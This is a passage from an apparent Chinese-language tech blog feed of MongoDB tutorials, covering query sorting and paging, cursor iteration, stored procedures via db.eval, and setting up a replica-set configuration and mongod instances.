&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x6761;&#x6570;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.things.find().count()</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong><code>skip()</code></strong> &#x9650;&#x5236;&#x8FD4;&#x56DE;&#x8BB0;&#x5F55;&#x7684;&#x8D77;&#x70B9;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x4ECE;&#x7B2C;31&#x6761;&#x8BB0;&#x5F55;&#x5F00;&#x59CB;&#xFF0C;&#x8FD4;&#x56DE;10&#x6761;&#x8BB0;&#x5F55;</span></span><br><span class="line">db.userProfile.find().skip(<span class="number">31</span>).limit(<span class="number">10</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x6392;&#x5E8F;"><a href="#&#x6392;&#x5E8F;" class="headerlink" title="&#x6392;&#x5E8F;"></a>&#x6392;&#x5E8F;</h3><p><strong>&#x4EE5;&#x5E74;&#x9F84;&#x5347;&#x5E8F;ASC</strong><br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.c2.find().sort({<span class="attr">age</span>: <span class="number">1</span>})</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4EE5;&#x5E74;&#x9F84;&#x964D;&#x5E8F;DESC</strong><br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.c2.find().sort({<span class="attr">age</span>:<span class="number">-1</span>})</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x6E38;&#x6807;"><a href="#&#x6E38;&#x6807;" class="headerlink" title="&#x6E38;&#x6807;"></a>&#x6E38;&#x6807;</h2><p>&#x50CF;&#x5927;&#x591A;&#x6570;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x4E00;&#x6837;&#xFF0C;MongoDB&#x4E5F;&#x662F;&#x7528;&#x6E38;&#x6807;&#x6765;&#x5FAA;&#x73AF;&#x5904;&#x7406;&#x6BCF;&#x4E00;&#x6761;&#x7ED3;&#x679C;&#x6570;&#x636E;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">for</span>(<span class="keyword">var</span> c=db.c2.find();c.hasNext();){</span><br><span class="line">... printjson(c.next())}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ab&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">19</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ac&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">20</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ad&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">21</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ae&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">22</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97af&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">23</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b0&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">24</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b1&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">25</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b2&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">26</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b3&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">27</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b4&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">28</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// &#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;</span></span><br><span class="line">&gt; db.c2.find().forEach(<span class="function"><span class="keyword">function</span>(<span class="params">u</span>)</span>{printjson(u)})</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ab&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">19</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ac&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">20</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ad&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">21</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ae&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">22</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97af&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">23</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b0&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">24</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b1&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">25</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b2&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">26</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b3&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">27</span></span><br><span class="line">}</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b4&quot;</span>),</span><br><span class="line">        <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> : <span class="number">28</span></span><br><span class="line">}</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;"><a href="#&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;"></a>&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;</h2><p>MongoDB&#x540C;&#x6837;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3002;&#x5173;&#x4E8E;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x5C31;&#x662F;&#x5B83;&#x662F;&#x7528;JavaScript&#x6765;&#x5199;&#x7684;&#x3002;<br>MongoDB&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x662F;&#x5B58;&#x50A8;&#x5728;db.system.js&#x8868;&#x4E2D;&#x3002;</p><p>MongoDB&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x521B;&#x5EFA;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;</span></span><br><span class="line">&gt; db.system.save({<span class="attr">_id</span>:<span class="string">&quot;addNumbers&quot;</span>,<span class="attr">value</span>:<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>{<span class="keyword">return</span> x+y}})</span><br><span class="line">WriteResult({ <span class="string">&quot;nMatched&quot;</span> : <span class="number">0</span>, <span class="string">&quot;nUpserted&quot;</span> : <span class="number">1</span>, <span class="string">&quot;nModified&quot;</span> : <span class="number">0</span>, <span class="string">&quot;_id&quot;</span> : <span class="string">&quot;addNumbers&quot;</span> })</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x53EF;&#x4EE5;&#x4EE5;&#x4E0B;&#x65B9;&#x6CD5;&#x68C0;&#x67E5;&#x5B58;&#x50A8;</span></span><br><span class="line">&gt; db.system.js.find()</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : <span class="string">&quot;addNumbers&quot;</span>, <span class="string">&quot;value&quot;</span> : { <span class="string">&quot;code&quot;</span> : <span class="string">&quot;function (x,y){return x+y}&quot;</span> } }</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8C03;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;</span></span><br><span class="line">&gt; db.eval(<span class="string">&apos;addNumber(3,4.2)&apos;</span>)</span><br><span class="line">WARNING: db.eval is deprecated</span><br><span class="line"><span class="number">7.2</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x53C2;&#x8003;&#xFF1A;"><a href="#&#x53C2;&#x8003;&#xFF1A;" class="headerlink" title="&#x53C2;&#x8003;&#xFF1A;"></a>&#x53C2;&#x8003;&#xFF1A;</h2><p><a href="https://www.mongodb.com/docs/v4.2/reference/method/js-collection/" target="_blank" rel="noopener">https://www.mongodb.com/docs/v4.2/reference/method/js-collection/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x8FDE;&amp;#x63A5;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&quot;&gt;&lt;a href=&quot;#&amp;#x8FDE;&amp;#x63A5;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x8FDE;&amp;#x6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MongoDB安装部署</title>
    <link href="https://marnm.github.io//posts/55c06d78/"/>
    <id>https://marnm.github.io//posts/55c06d78/</id>
    <published>2022-06-07T04:42:53.000Z</published>
    <updated>2022-06-07T05:17:19.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;"><a href="#MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;" class="headerlink" title="MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;"></a>MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;</h1><p><strong>&#x5B98;&#x65B9;&#x6587;&#x6863;</strong></p><p><a href="https://docs.mongodb.com/manual/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/</a></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server11 ~]&amp; cat &gt;/opt/mongo_cluster/mongo_28017/conf/mongo_28017.conf &lt;&lt;EOF</span><br><span class="line">systemLog:</span><br><span class="line">  destination: file</span><br><span class="line">  logAppend: true</span><br><span class="line">  path: /opt/mongo_cluster/mongo_28017/logs/mongodb.log</span><br><span class="line"></span><br><span class="line">storage:</span><br><span class="line">  journal:</span><br><span class="line">    enabled: true</span><br><span class="line">  dbPath: /data/mongo_cluster/mongo_28017</span><br><span class="line">  directoryPerDB: true</span><br><span class="line">  wiredTiger:</span><br><span class="line">     engineConfig:</span><br><span class="line">        cacheSizeGB: 1</span><br><span class="line">        directoryForIndexes: true</span><br><span class="line">     collectionConfig:</span><br><span class="line">         blockCompressor: zlib</span><br><span class="line">     indexConfig:</span><br><span class="line">        prefixCompression: true</span><br><span class="line"></span><br><span class="line">processManagement:</span><br><span class="line">  fork: true</span><br><span class="line">  pidFilePath: /opt/mongo_cluster/mongo_28017/pid/mongod.pid</span><br><span class="line"></span><br><span class="line">net:</span><br><span class="line">  port: 28017</span><br><span class="line">  bindIp: 127.0.0.1,192.168.10.11</span><br><span class="line"></span><br><span class="line">replication:</span><br><span class="line">  oplogSizeMB: 1024</span><br><span class="line">  replSetName: dba666</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28017/conf/mongo_28017.conf</span><br><span class="line">about to fork child process, waiting until server is ready for connections.</span><br><span class="line">forked process: 2463</span><br><span class="line">child process started successfully, parent exiting</span><br><span class="line">[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28018/conf/mongo_28018.conf</span><br><span class="line">about to fork child process, waiting until server is ready for connections.</span><br><span class="line">forked process: 2492</span><br><span class="line">child process started successfully, parent exiting</span><br><span class="line">[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28019/conf/mongo_28019.conf</span><br><span class="line">about to fork child process, waiting until server is ready for connections.</span><br><span class="line">forked process: 2521</span><br><span class="line">child process started successfully, parent exiting</span><br><span class="line">[root@rhel7 ~]&amp;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; netstat -pantul |grep mongo</span><br><span class="line">tcp        0      0 0.0.0.0:28017           0.0.0.0:*               LISTEN      2463/mongod</span><br><span class="line">tcp        0      0 0.0.0.0:28018           0.0.0.0:*               LISTEN      2492/mongod</span><br><span class="line">tcp        0      0 0.0.0.0:28019           0.0.0.0:*               LISTEN      2521/mongod</span><br><span class="line">tcp        0      0 0.0.0.0:27017           0.0.0.0:*               LISTEN      1410/mongod</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MongoDB&amp;#x5B89;&amp;#x88C5;&amp;#x90E8;&amp;#x7F72;&quot;&gt;&lt;a href=&quot;#MongoDB&amp;#x5B89;&amp;#x88C5;&amp;#x90E8;&amp;#x7F72;&quot; class=&quot;headerlink&quot; title=&quot;MongoDB&amp;#x5B89
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MongoDB介绍</title>
    <link href="https://marnm.github.io//posts/8b1c1f4b/"/>
    <id>https://marnm.github.io//posts/8b1c1f4b/</id>
    <published>2022-06-07T04:42:46.000Z</published>
    <updated>2022-06-07T05:17:42.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB&#x4ECB;&#x7ECD;"><a href="#MongoDB&#x4ECB;&#x7ECD;" class="headerlink" title="MongoDB&#x4ECB;&#x7ECD;"></a>MongoDB&#x4ECB;&#x7ECD;</h1><p>Mongodb &#x7531; C++&#x8BED;&#x8A00;&#x7F16;&#x5199;&#x7684;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x7684;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x3002;&#xFF0C;&#x662F;&#x4E13;&#x4E3A;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x9AD8;&#x6027;&#x80FD;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C; &#x662F;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x529F;&#x80FD;&#x6700;&#x4E30;&#x5BCC;&#xFF0C;&#x6700;&#x50CF;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x975E;&#x5E38;&#x6563;&#xFF0C;&#x662F;&#x7C7B;&#x4F3C; json &#x7684; bjson &#x683C;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x3002;</p><p>MongoDB &#x7684;&#xFF08;&#x6765;&#x81EA;&#x4E8E;&#x82F1;&#x6587;&#x5355;&#x8BCD;&#x201C;&#x4E86; Humongous&#x201D;&#xFF0C;&#x4E2D;&#x6587;&#x542B;&#x4E49;&#x4E3A;&#x201C;&#x5E9E;&#x5927;&#x201D;&#xFF09;&#x662F;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x4E8E;&#x5404;&#x79CD;&#x89C4;&#x6A21;&#x7684;&#x4F01;&#x4E1A;&#xFF0C;&#x5404;&#x4E2A;&#x884C;&#x4E1A;&#x4EE5;&#x53CA;&#x5404;&#x7C7B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#x3002;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x9002;&#x7528;&#x4E8E;&#x654F;&#x6377;&#x5F00;&#x53D1;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;MongoDB&#x7684;&#x6570;&#x636E;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x968F;&#x7740;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x53D1;&#x5C55;&#x800C;&#x7075;&#x6D3B;&#x5730;&#x66F4;&#x65B0;&#x3002;<br>MongoDB &#x4EE5;&#x4E00;&#x79CD;&#x53EB;&#x505A; BSON&#xFF08;&#x4E8C;&#x8FDB;&#x5236; JSON&#xFF09;&#x7684;&#x5B58;&#x50A8;&#x5F62;&#x5F0F;&#x5C06;&#x6570;&#x636E;&#x4F5C;&#x4E3A;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x3002;&#x5177;&#x6709;&#x76F8;&#x4F3C;&#x7ED3;&#x6784;&#x7684;&#x6587;&#x6863;&#x901A;&#x5E38;&#x88AB;&#x6574;&#x7406;&#x6210;&#x96C6;&#x5408;&#x3002;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E9B;&#x96C6;&#x5408;&#x770B;&#x6210;&#x7C7B;&#x4F3C;&#x4E8E;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#xFF1A; &#x6587;&#x6863;&#x548C;&#x884C;&#x76F8;&#x4F3C;&#xFF0C; &#x5B57;&#x6BB5;&#x548C;&#x5217;&#x76F8;&#x4F3C;&#x3002;</p><blockquote><p>MongoDB&#x662F;&#x4E13;&#x4E3A;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x9AD8;&#x6027;&#x80FD;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x4ECE;&#x5355;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#x6269;&#x5C55;&#x5230;&#x5927;&#x578B;&#x3001;&#x590D;&#x6742;&#x7684;&#x591A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x67B6;&#x6784;&#x3002;&#x5229;&#x7528;&#x5185;&#x5B58;&#x8BA1;&#x7B97;&#x7684;&#x4F18;&#x52BF;&#xFF0C;MongoDB&#x80FD;&#x591F;&#x63D0;&#x4F9B;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6570;&#x636E;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x3002; MongoDB&#x7684;&#x672C;&#x5730;&#x590D;&#x5236;&#x548C;&#x81EA;&#x52A8;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x529F;&#x80FD;&#x4F7F;&#x60A8;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5177;&#x6709;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x53EF;&#x9760;&#x6027;&#x548C;&#x64CD;&#x4F5C;&#x7075;&#x6D3B;&#x6027;</p></blockquote><h2 id="2-1-MongoDB-&#x6570;&#x636E;&#x683C;&#x5F0F;"><a href="#2-1-MongoDB-&#x6570;&#x636E;&#x683C;&#x5F0F;" class="headerlink" title="2.1 MongoDB &#x6570;&#x636E;&#x683C;&#x5F0F;"></a>2.1 MongoDB &#x6570;&#x636E;&#x683C;&#x5F0F;</h2><h3 id="2-1-1-JSON"><a href="#2-1-1-JSON" class="headerlink" title="2.1.1 JSON"></a>2.1.1 JSON</h3><p>JSON(JavaScript Object Notation) &#x662F;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x683C;&#x5F0F;&#x3002;JSON &#x91C7;&#x7528;&#x5B8C;&#x5168;&#x72EC;&#x7ACB;&#x4E8E;&#x8BED;&#x8A00;&#x7684;&#x6587;&#x672C;&#x683C;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x4F7F;&#x7528;&#x4E86;&#x7C7B;&#x4F3C;&#x4E8E; C &#x8BED;&#x8A00;&#x5BB6;&#x65CF;&#x7684;&#x4E60;&#x60EF;&#xFF08;&#x5305;&#x62EC; C&#x3001; C++&#x3001; C#&#x3001; Java&#x3001;JavaScript&#x3001; Perl&#x3001;Python &#x7B49;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x7279;&#x6027;&#x4F7F; JSON 